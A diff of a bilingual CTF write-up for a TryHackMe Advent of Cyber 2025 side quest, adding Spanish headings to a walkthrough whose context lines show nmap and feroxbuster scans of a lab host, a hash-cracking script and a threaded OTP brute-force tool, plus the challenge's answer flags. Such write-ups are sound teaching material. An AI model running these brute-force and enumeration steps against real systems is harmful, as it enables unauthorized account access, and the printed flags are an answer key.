@@ -1,13 +1,12 @@
 #source https://github.com/id-root/BreachBlocker-Unlocker
 
-# BreachBlocker Unlocker
+# Advent 2025\SideQuest\Sidequest\Sidequest4\Tutorial\Tutorial_id_root [N/A]
 
 ##### Check out Advent Of Cyber 2025 Side quest 4 by TryHackMe: https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK
 
+## **Fase 1: Reconocimiento** / **Phase 1: Reconnaissance**
 
-## **Phase 1: Reconnaissance**
-
-### **Initial Nmap Scan**
+### **Escaneo inicial con Nmap** / **Initial Nmap Scan**
 
 ```bash
 nmap -p- -sV 10.48.180.216
@@ -20,7 +19,7 @@ PORT    STATE  SERVICE  VERSION
 8443/tcp open  ssl/http nginx 1.29.3
 ```
 
-### Directory Enumeration
+### Enumeración de directorios / Directory Enumeration
 
 ```bash
 feroxbuster -u https://10.48.180.216:8443 \
@@ -65,7 +64,7 @@ app.secret_key = os.getenv('SECRETKEY')
 
 aes_key = bytes(os.getenv('AESKEY'), "utf-8")
 
-# Credentials (server-side only)
+## Credentials (server-side only)
 HOPFLIX_FLAG = os.getenv('HOPFLIX_FLAG')
 BANK_ACCOUNT_ID = "hopper"
 BANK_PIN = os.getenv('BANK_PIN')
@@ -119,7 +118,6 @@ def send_otp_email(otp, to_addr):
     s = smtplib.SMTP('smtp')
     s.sendmail(from_addr, to_addr, message)
     s.quit()
-
 
 def hopper_hash(s):
     res = s
@@ -292,7 +290,7 @@ target_hashes = set([
     "96e56d15f089c659a1bbc1d2b6f70b6c80720f1a",
 ])
 
-# Test ordinal values as strings
+## Test ordinal values as strings
 def hopper_ord(c):
     res = str(ord(c))
     for i in range(5000):
@@ -306,7 +304,7 @@ for i in range(256):
     if h in target_hashes:
         print(f"FOUND ord: {repr(c)} (ord={ord(c)}) -> {h}")
 
-# Test with fewer iterations (100, 500, 1000)
+## Test with fewer iterations (100, 500, 1000)
 def hopper_n(s, n):
     res = s
     for i in range(n):
@@ -388,7 +386,6 @@ found = {}
 total_attempts = 0
 lock = threading.Lock()
 
-
 def worker(start, step, cookie):
     global total_attempts
     s = requests.Session()
@@ -436,7 +433,6 @@ def worker(start, step, cookie):
         except Exception:
             continue
 
-
 def main():
     # ===================== BANNER =====================
     print(r"""
@@ -446,7 +442,6 @@ def main():
 ██║     ██║     ██║       ██╔═══╝
 ╚█████ ██╔╝     ██║       ██║
  ╚══════╝       ╚═╝       ╚═╝
-
 
         OTP Brute Force
 --------------------------------
@@ -486,7 +481,6 @@ def main():
     else:
         print("\n[-] Completed: OTP space exhausted — no valid code found")
 
-
 if __name__ == "__main__":
     main()
 
@@ -501,7 +495,6 @@ OUTPUT:
 ██║     ██║     ██║       ██╔═══╝
 ╚█████ ██╔╝     ██║       ██║
  ╚══════╝       ╚═╝       ╚═╝
-
 
         OTP Brute Force
 --------------------------------
@@ -530,8 +523,7 @@ THM{neggative_balance}
 
 Congratulation you found all 3 flags....
 
-
-## Solution 
+## Solución / Solution 
  
  What's the CODE_FLAG?
 
@@ -546,7 +538,5 @@ What's the BANK_FLAG?
 
 FLAG3 `THM{neggative_balance}`
 
-
-
-# Overview
+## Resumen / Overview
 ![Infographics](Infographics.png)
